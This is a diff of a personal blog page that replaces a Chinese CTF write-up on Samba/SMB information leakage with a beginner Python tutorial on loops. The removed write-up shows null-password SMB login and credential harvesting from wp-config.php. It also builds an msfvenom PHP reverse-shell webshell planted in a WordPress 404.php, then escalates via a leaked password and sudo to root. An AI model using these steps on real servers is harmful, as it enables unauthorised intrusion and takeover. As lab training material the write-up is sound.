@@ -13,24 +13,38 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2024/09/11/cfb8804dd1b5/"/>
+    <link rel="canonical" href="http://example.com/2024/09/29/3670918b968d/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="Samba&#x2F;SMB信息泄露Serve Message Block &#x3D;&#x3D;SMB常用端口为139，445&#x3D;&#x3D; &#x3D;&#x3D;mysql常用端口为3306&#x3D;&#x3D; SMB协议用来访问网络资源，下载对应的资源文件 信息探测nmap -sV ip 探测开放服务 nmap -A -v -T4 ip 探测全部信息（T4——最大线程速度）">
+        <meta name="description" content="前言首先我们需要了解以下为什么我们要使用循环结构。比如你想要对一个文字重复输出，比如输出9999编，难道你要敲9999个print()吗？这显然是不现实的，你就算复制粘贴也要很长时间。所以我们引入了循环结构，你只需要设置循环条件，以及循环结构中需要执行的操作即可。循环操作的应用面很广，可以和上一章的分支结构相结合来使用。 循环结构就是程序中控制某条或者某些指令重复执行的结构。在Pytho中有for">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SambaSMB信息泄露（Serve Message Block)">
-<meta property="og:url" content="http://example.com/2024/09/11/cfb8804dd1b5/index.html">
+<meta property="og:title" content="Python从入门到精通——3.2 循环结构">
+<meta property="og:url" content="http://example.com/2024/09/29/3670918b968d/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Samba&#x2F;SMB信息泄露Serve Message Block &#x3D;&#x3D;SMB常用端口为139，445&#x3D;&#x3D; &#x3D;&#x3D;mysql常用端口为3306&#x3D;&#x3D; SMB协议用来访问网络资源，下载对应的资源文件 信息探测nmap -sV ip 探测开放服务 nmap -A -v -T4 ip 探测全部信息（T4——最大线程速度）">
+<meta property="og:description" content="前言首先我们需要了解以下为什么我们要使用循环结构。比如你想要对一个文字重复输出，比如输出9999编，难道你要敲9999个print()吗？这显然是不现实的，你就算复制粘贴也要很长时间。所以我们引入了循环结构，你只需要设置循环条件，以及循环结构中需要执行的操作即可。循环操作的应用面很广，可以和上一章的分支结构相结合来使用。 循环结构就是程序中控制某条或者某些指令重复执行的结构。在Pytho中有for">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-09-11T10:53:11.000Z">
-<meta property="article:modified_time" content="2024-09-12T00:18:13.844Z">
+<meta property="og:image" content="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409291247385.png">
+<meta property="og:image" content="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409291249251.gif">
+<meta property="og:image" content="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202410092012874.png">
+<meta property="og:image" content="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202410092015625.png">
+<meta property="og:image" content="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202410092018853.png">
+<meta property="og:image" content="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202410092023937.png">
+<meta property="og:image" content="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202410092026789.png">
+<meta property="og:image" content="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202410092028975.png">
+<meta property="og:image" content="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202410092030363.png">
+<meta property="og:image" content="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202410092042650.png">
+<meta property="og:image" content="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202410092043498.png">
+<meta property="og:image" content="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202410092319589.png">
+<meta property="og:image" content="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202410092320755.png">
+<meta property="article:published_time" content="2024-09-29T10:26:37.000Z">
+<meta property="article:modified_time" content="2024-10-09T15:42:10.704Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="CTF">
-<meta property="article:tag" content="SMB">
+<meta property="article:tag" content="python">
+<meta property="article:tag" content="基础">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409291247385.png">
     
     
         <!-- Google tag (gtag.js) -->
@@ -52,7 +66,7 @@
     
     <title>
         
-            SambaSMB信息泄露（Serve Message Block) -
+            Python从入门到精通——3.2 循环结构 -
         
         Dunm1e &#39; s World
     </title>
@@ -525,7 +539,7 @@
         <div class="article-title relative w-full">
             
                 <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">SambaSMB信息泄露（Serve Message Block)</h1>
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Python从入门到精通——3.2 循环结构</h1>
                 </div>
             
             </div>
@@ -546,15 +560,15 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2024-09-11 18:53:11</span>
-        <span class="mobile">2024-09-11 18:53:11</span>
+        <span class="desktop">2024-09-29 18:26:37</span>
+        <span class="mobile">2024-09-29 18:26:37</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-09-12 08:18:13</span>
-            <span class="mobile">2024-09-12 08:18:13</span>
+            <span class="desktop">2024-10-09 23:42:10</span>
+            <span class="mobile">2024-10-09 23:42:10</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -568,7 +582,7 @@
                     
                         
                         <li>
-                            <a href="/categories/CTF/">CTF</a>&nbsp;
+                            <a href="/categories/python/">python</a>&nbsp;
                         </li>
                     
                     
@@ -578,7 +592,7 @@
                             <li>></li>
                         
                         <li>
-                            <a href="/categories/CTF/Web/">Web</a>&nbsp;
+                            <a href="/categories/python/%E6%95%99%E7%A8%8B/">教程</a>&nbsp;
                         </li>
                     
                     
@@ -592,11 +606,11 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/CTF/">CTF</a>&nbsp;
+                        <a href="/tags/python/">python</a>&nbsp;
                     </li>
                 
                     <li>
-                        | <a href="/tags/SMB/">SMB</a>&nbsp;
+                        | <a href="/tags/%E5%9F%BA%E7%A1%80/">基础</a>&nbsp;
                     </li>
                 
             </ul>
@@ -606,12 +620,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>614 Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.5k Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>2 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>6 Mins</span>
         </span>
     
     
@@ -630,59 +644,121 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <h1 id="Samba-SMB信息泄露"><a href="#Samba-SMB信息泄露" class="headerlink" title="Samba&#x2F;SMB信息泄露"></a>Samba&#x2F;SMB信息泄露</h1><p>Serve Message Block</p>
-<p>&#x3D;&#x3D;SMB常用端口为139，445&#x3D;&#x3D;</p>
-<p>&#x3D;&#x3D;mysql常用端口为3306&#x3D;&#x3D;</p>
-<p>SMB协议用来访问网络资源，下载对应的资源文件</p>
-<h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p><code>nmap -sV ip</code> 探测开放服务</p>
-<p><code>nmap -A -v -T4 ip </code>探测全部信息（T4——最大线程速度）</p>
-<p>&#x3D;&#x3D;注意特殊端口（大于1024）&#x3D;&#x3D;</p>
-<h2 id="针对SMB协议弱点分析"><a href="#针对SMB协议弱点分析" class="headerlink" title="针对SMB协议弱点分析"></a>针对SMB协议弱点分析</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ol>
-<li><p>针对SMB协议，使用空口令，弱口令尝试登陆，并查看敏感文件，下载查看；</p>
-<p>1. </p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L ip   <span class="comment">#表示该ip所有分享的目录和链接</span></span><br><span class="line"><span class="comment"># 输入后需要输入密码，我们直接回车，表示空命令</span></span><br><span class="line"></span><br><span class="line">smbclient <span class="string">&#x27;\\ip\share$&#x27;</span> <span class="comment"># 表示要查看的共享文件夹 share可以替换为其他的如print等</span></span><br><span class="line">smbclient <span class="string">&#x27;\\ip\IPC$&#x27;</span> <span class="comment"># 登录空链接</span></span><br><span class="line"></span><br><span class="line">get 敏感文件名 <span class="comment"># 下载敏感文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先我们需要了解以下为什么我们要使用循环结构。比如你想要对一个文字重复输出，比如输出9999编，难道你要敲9999个<code>print()</code>吗？这显然是不现实的，你就算复制粘贴也要很长时间。所以我们引入了循环结构，你只需要设置循环条件，以及循环结构中需要执行的操作即可。循环操作的应用面很广，可以和上一章的分支结构相结合来使用。</p>
+<p>循环结构就是程序中控制某条或者某些指令重复执行的结构。在Pytho中有<code>for</code>循环和<code>while</code>循环两种。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409291247385.png"
+                      alt="image.png"
+                ></p>
+<blockquote>
+<p>图片来源：菜鸟教程</p>
+</blockquote>
+<h1 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h1><p>如果不知道具体的循环次数，我们可以使用<code>while</code>循环。<code>while</code>循环的<strong>核心就是条件设置</strong>，当不满足条件时就跳出循环。<code>while</code>循环通过一个能够产生或转换出<code>bool</code>值的表达式来控制循环，表达式的值为<code>True</code>则继续循环；表达式的值为<code>False</code>则结束循环。<br>下面我们来看一个GIF动画演示<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409291249251.gif"
+                     
+                ></p>
+<p>下面先来看一个例子，利用<code>while</code>循环来进行求和：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202410092012874.png"
+                      alt="image.png"
+                ><br>可以看到，当<code>while</code>语句的条件满足时，将会一直进行循环操作，直到条件不满足<br>所以利用这个思想，我们可以进行无限循环，比如让表达式的条件始终为<code>True</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202410092015625.png"
+                      alt="image.png"
+                ><br>这样无限循环最后肯定会让内存爆满从而强行停止，这样是不是可以偷偷做一些事情，我也不知道是什么。<strong>可以利用CTRL+C强行退出循环</strong></p>
+<h2 id="while-else-语句"><a href="#while-else-语句" class="headerlink" title="while else 语句"></a>while else 语句</h2><p>当<code>while</code>语句结束后，也就是条件表达式为<code>False</code>时，将会执行<code>else</code>后的语句<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202410092018853.png"
+                      alt="image.png"
+                ></p>
+<p>接下来我们再举一个while循环经典的例子：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202410092023937.png"
+                     
+                ></p>
+<p>上面的<code>break</code>关键字，可以让程序跳出循环，不仅是<code>while</code>循环，后面的<code>for</code>循环也可以跳出，<strong>但是<code>break</code>是只能跳出一层循环的</strong><br>还有个关键字是<code>continue</code>，是指直接放弃当前循环后面的代码，进入下一轮循环<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202410092026789.png"
+                      alt="image.png"
+                ></p>
+<h1 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h1><p>for循环是很强大的，可以遍历任何可迭代对象，包括一个列表或者一个范围。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202410092028975.png"
+                      alt="image.png"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202410092030363.png"
+                      alt="image.png"
+                ></p>
+<p>上面的例子使用到了<code>for...in</code>语句，一般是遍历某个字符串或者列表等具有一系列单独数据的对象</p>
+<p>for循环也可以遍历一个范围，我们一般是利用<code>range()</code>函数<br>我们先来介绍一下<code>range()</code>函数，我们一般用这个函数来构造一个整数范围，可以是连续的也可以是间隔的，我们先举几个例子</p>
+<ul>
+<li><code>range(101)</code>：可以用来产生0到100范围的整数，需要注意的是取不到101。</li>
+<li><code>range(1, 101)</code>：可以用来产生1到100范围的整数，相当于前面是闭区间后面是开区间。</li>
+<li><code>range(1, 101, 2)</code>：可以用来产生1到100的奇数，其中2是步长，即每次数值递增的值。</li>
+<li><code>range(100, 0, -2)</code>：可以用来产生100到1的偶数，其中-2是步长，即每次数字递减的值。</li>
+</ul>
+<p>当我们想遍历一个列表等对象时，你可能不知道这个对象的长度，这样我们就可以结合<code>range()</code>和<code>len()</code>函数：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202410092042650.png"
+                      alt="image.png"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202410092043498.png"
+                      alt="image.png"
+                ></p>
+<p>这里再讲一个关键字<code>pass</code><br>这个关键字可以用到本节的循环结构中，也可以用到之后需要学习的函数中<br><code>pass</code>是一个空语句，只是为了保持程序结构完整性，不做任何事情，一般可以理解为跳过，或者空等待。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202410092319589.png"
+                      alt="image.png"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202410092320755.png"
+                      alt="image.png"
+                ></p>
+<p>最后再来几个练习吧</p>
+<blockquote>
+<p>[!NOTE] 练习1：  输入一个正整数判断是不是素数。<br><strong>提示</strong>：素数指的是只能被1和自身整除的大于1的整数。</p>
+</blockquote>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"></span><br><span class="line">num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入一个正整数: &#x27;</span>))</span><br><span class="line">end = <span class="built_in">int</span>(sqrt(num))</span><br><span class="line">is_prime = <span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, end + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> num % x == <span class="number">0</span>:</span><br><span class="line">        is_prime = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> is_prime <span class="keyword">and</span> num != <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%d是素数&#x27;</span> % num)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%d不是素数&#x27;</span> % num)</span><br></pre></td></tr></table></figure></div>
 
-<p>打开下载的文件deets.txt，可以发现密码password为12345 </p>
-<p>再打开wordpress文件夹，然后下载wp-config.php并打开，得到数据库名，用户名user和密码pwd</p>
-<p>连接mysql</p>
-<p><code>mysql -h ip -u user -p</code></p>
-<p>但是可能无法远程登录mysql，于是尝试ssh登录</p>
-<p><code>ssh 用户名@ip</code></p>
-<p>尝试数据库密码，密码错误</p>
-</li>
-<li><p>针对SMB协议远程溢出漏洞进行分析</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit samba版本号</span><br><span class="line"></span><br><span class="line">searchsploit Samba smbd 3.X - 4.X</span><br></pre></td></tr></table></figure></div>
 
-<p>发现也没有漏洞</p>
-</li>
-</ol>
-<h2 id="针对HTTP协议弱点分析"><a href="#针对HTTP协议弱点分析" class="headerlink" title="针对HTTP协议弱点分析"></a>针对HTTP协议弱点分析</h2><h3 id="1-浏览器查看网站"><a href="#1-浏览器查看网站" class="headerlink" title="1. 浏览器查看网站"></a>1. 浏览器查看网站</h3><h3 id="2-使用dirb-nicko扫描"><a href="#2-使用dirb-nicko扫描" class="headerlink" title="2. 使用dirb nicko扫描"></a>2. 使用dirb nicko扫描</h3><p><code>dirb http://ip:port/</code><strong>(80端口可省略)</strong></p>
-<p>扫描到网站后台目录</p>
-<p>打开并输入用户名和密码</p>
-<h3 id="3-上传webshell"><a href="#3-上传webshell" class="headerlink" title="3.上传webshell"></a>3.上传webshell</h3><p>wordpress有常见漏洞</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机ip lport=4444 raw</span><br><span class="line"><span class="comment"># 将生成的webshell复制到一个php文件中</span></span><br><span class="line">gedit webshell.php</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi//handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp <span class="comment"># 监听</span></span><br><span class="line"><span class="built_in">set</span> lhost 攻击机ip</span><br><span class="line">show options <span class="comment"># 查看参数</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+<blockquote>
+<p>[!NOTE] 练习2：输入两个正整数，计算它们的最大公约数和最小公倍数。</p>
+</blockquote>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;x = &#x27;</span>))</span><br><span class="line">y = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;y = &#x27;</span>))</span><br><span class="line"><span class="comment"># 如果x大于y就交换x和y的值</span></span><br><span class="line"><span class="keyword">if</span> x &gt; y:</span><br><span class="line">    <span class="comment"># 通过下面的操作将y的值赋给x, 将x的值赋给y</span></span><br><span class="line">    x, y = y, x</span><br><span class="line"><span class="comment"># 从两个数中较小的数开始做递减的循环</span></span><br><span class="line"><span class="keyword">for</span> factor <span class="keyword">in</span> <span class="built_in">range</span>(x, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> x % factor == <span class="number">0</span> <span class="keyword">and</span> y % factor == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%d和%d的最大公约数是%d&#x27;</span> % (x, y, factor))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%d和%d的最小公倍数是%d&#x27;</span> % (x, y, x * y // factor))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>
 
-<p>然后就是上传webshell，并且执行（访问具有webshell的php页面）</p>
-<p>我们将webshell上传到editor的404.php页面</p>
-<p>然后打开404页面</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://靶场IP/wordpress/wp-content/themes/twentyfourteen/404.php</span><br></pre></td></tr></table></figure></div>
 
-<p>然后返回攻击机，发现成功监听，查看当前用户，执行以下命令</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
+<blockquote>
+<p>[!NOTE]  练习3：打印如下所示的三角形图案。</p>
+</blockquote>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*</span><br><span class="line">**</span><br><span class="line">***</span><br><span class="line">****</span><br><span class="line">*****</span><br></pre></td></tr></table></figure></div>
 
-<p>发现获得服务器的通用权限</p>
-<p>优化终端</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    *</span><br><span class="line">   **</span><br><span class="line">  ***</span><br><span class="line"> ****</span><br><span class="line">*****</span><br></pre></td></tr></table></figure></div>
 
-<p>查看当前计算机的用户</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    *</span><br><span class="line">   ***</span><br><span class="line">  *****</span><br><span class="line"> *******</span><br><span class="line">*********</span><br></pre></td></tr></table></figure></div>
 
-<p>查看敏感用户，发现一个togie</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su togie</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入密码为12345，前面获取的密码</span></span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">row = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入行数: &#x27;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;*&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(row):</span><br><span class="line">        <span class="keyword">if</span> j &lt; row - i - <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;*&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(row - i - <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> * i + <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;*&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure></div>
 
-<h3 id="4-提升权限"><a href="#4-提升权限" class="headerlink" title="4. 提升权限"></a>4. 提升权限</h3><p>查找共享目录下的敏感文件</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"><span class="built_in">sudo</span> su</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br></pre></td></tr></table></figure></div>
 
+<blockquote>
+<p>[!NOTE] 练习4：打印乘法口诀表<br>可以尝试左下三角和右上三角</p>
+</blockquote>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#左上角</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i,<span class="number">10</span>):</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>*<span class="subst">&#123;j&#125;</span>=<span class="subst">&#123;i*j&#125;</span>&quot;</span>,end = <span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">#右上角</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,i):</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(end = <span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i,<span class="number">10</span>):</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>*<span class="subst">&#123;j&#125;</span>=<span class="subst">&#123;i*j&#125;</span>&quot;</span>,end = <span class="string">&#x27;\t&#x27;</span>)</span><br><span 